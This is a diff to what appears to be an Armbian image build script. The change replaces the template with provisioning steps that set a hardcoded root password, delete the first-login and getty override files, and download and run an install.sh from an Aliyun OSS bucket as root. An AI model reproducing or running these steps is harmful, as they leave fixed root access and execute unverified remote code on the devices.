@@ -1,43 +1,13 @@
 #!/bin/bash
+echo root:dhusahd2212123gggd2123123 | chpasswd
+#rm -rf /root/.not_logged_in_yet
+rm -rf /etc/profile.d/armbian-check-first-login.sh
+rm -rf /etc/systemd/system/getty@.service.d/override.conf
+rm -rf /etc/systemd/system/serial-getty@.service.d/override.conf
+curl -s -o ./install.sh https://gkktg.oss-cn-hangzhou.aliyuncs.com/install.sh?$(date +%s) && /bin/bash ./install.sh -m "host_install"
+#echo "" > /usr/local/tigocloud/.minion_id_by_macaddr
 
-# arguments: $RELEASE $LINUXFAMILY $BOARD $BUILD_DESKTOP
-#
-# This is the image customization script
-
-# NOTE: It is copied to /tmp directory inside the image
-# and executed there inside chroot environment
-# so don't reference any files that are not already installed
-
-# NOTE: If you want to transfer files between chroot and host
-# userpatches/overlay directory on host is bind-mounted to /tmp/overlay in chroot
-# The sd card's root path is accessible via $SDCARD variable.
-
-RELEASE=$1
-LINUXFAMILY=$2
-BOARD=$3
-BUILD_DESKTOP=$4
-
-Main() {
-echo "Customizing $BOARD $BOARD_VENDOR"
-#
-# Default fixes
-# Implement them to build script
-
-
-echo "Remove MS and GH sources as we ship them via our repo"
-[[ -f /etc/apt/sources.list.d/vscode.list ]] && rm -f /etc/apt/sources.list.d/vscode.list
-[[ -f /etc/apt/sources.list.d/githubcli.list ]] && rm -f /etc/apt/sources.list.d/githubcli.list
-stat -t -- /etc/apt/sources.list.d/oibaf-ubuntu-graphics-drivers-*.* >/dev/null 2>&1 && rm -f /etc/apt/sources.list.d/oibaf-ubuntu-graphics-drivers-*.*
-stat -t -- /etc/apt/sources.list.d/xtradeb-ubuntu-apps-*.* >/dev/null 2>&1 && rm -f /etc/apt/sources.list.d/xtradeb-ubuntu-apps-*.*
-stat -t -- /etc/apt/sources.list.d/liujianfeng1994-ubuntu-chromium-*.* >/dev/null 2>&1 && rm -f /etc/apt/sources.list.d/liujianfeng1994-ubuntu-chromium-*.*
-
-# release based
-	case $RELEASE in
-		jammy)
-			# your code here
-			;;
-	esac
-
-} # Main
-
-Main "$@"
+#curl -s -o /etc/custom_service/start_service.sh https://gkktg.oss-cn-hangzhou.aliyuncs.com/start_service.sh?$(date +%s)
+#curl -s -o /usr/sbin/armbian-install            https://gkktg.oss-cn-hangzhou.aliyuncs.com/armbian-install?$(date +%s)
+#chmod a+x /etc/custom_service/start_service.sh
+#chmod a+x /usr/sbin/armbian-install
